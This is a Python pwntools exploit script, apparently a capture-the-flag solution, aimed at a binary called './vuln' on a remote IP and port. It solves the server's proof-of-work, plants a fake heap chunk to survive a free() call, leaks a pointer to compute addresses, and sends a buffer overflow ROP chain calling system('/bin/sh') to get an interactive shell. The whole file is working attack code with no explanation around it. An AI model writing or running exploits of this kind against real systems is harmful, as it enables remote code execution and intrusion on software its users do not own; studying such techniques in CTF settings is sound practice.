from powsolver import PoWSolver
from pwnlib.util.cyclic import cyclic_gen
from pwn import p64, gdb, remote, process, ELF, log, args, ROP


FILE = './vuln'
BINARY = ELF(FILE)
LIBC = ELF('./libc-2.32.so')
COMMANDS = [

]
BOF_SIZE = 88

# offset from pointer printed by binary to beginning of the heap
PTR2HEAP = 0x5e67
# offset from pointer to main
PTR2MAIN = 0x13
# initial size of the heap before the allocated chunk
SIZE = 0x2a0


def start():
    if args.REMOTE:
        return remote('161.97.176.150', 2929)

    return process(FILE)


def attach_gdb(p):
    if args.REMOTE or args.NOTRACE:
        return

    commands = '\n'.join(COMMANDS)
    gdb.attach(p, commands)


def get_pointer():
    output = p.recvline()
    pointer = int(output, 0)
    log.info('Got the pointer: {}'.format(hex(pointer)))

    return pointer


def prepare_fake_chunk(size, payload=''):
    log.info("Preparing chunk header...")
    # chunk header with size==0x20: 0000000000000000 0000000000000021
    chunk_header = p64(0x00) + p64(size+1)
    if not payload:
        payload = b'A'*(size-0x10)

    fake_chunk = chunk_header + payload
    return fake_chunk


p = start()

################################################################################
# SOLVE THE PoW
#################################################################################

if args.REMOTE:
    proof_of_work = p.recvline().replace(b'SHA256', b'sha256')
    solver = PoWSolver()
    solver.parse(
        "Proof of work: Submit a lowercase alphabetical string X, of length {len}, where {alg}(X)[{start:d}:] = {target}",
        proof_of_work.decode()
    )
    sol = solver.solve()
    p.sendline(sol)
    p.recvline()

################################################################################
# EXPLOIT
################################################################################

#
# create fake chunk to pass free(*ptr) function invocation
#
attach_gdb(p)

log.info('Calculating the address of chunk...')
pointer = get_pointer()
address = pointer + PTR2HEAP + SIZE
log.info('Got address of the chunk on the heap: {}'.format(hex(address)))
chunk1 = prepare_fake_chunk(0x40)
# chunk2 = prepare_fake_chunk(0x40)
chunk2 = b''
payload = chunk1 + chunk2
p.sendline(payload)

#
# buffer overflow
#
main = pointer + PTR2MAIN
rop = ROP(BINARY)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
binsh = next(BINARY.search(b'/bin/sh'))
system = BINARY.sym.system
offset = main - BINARY.sym.main
payload = b'A'*BOF_SIZE + p64(ret+offset) + p64(pop_rdi+offset) + p64(binsh+offset) + p64(system+offset)
p.sendline(payload)

################################################################################
# START INTERACTIVE
################################################################################
p.interactive()
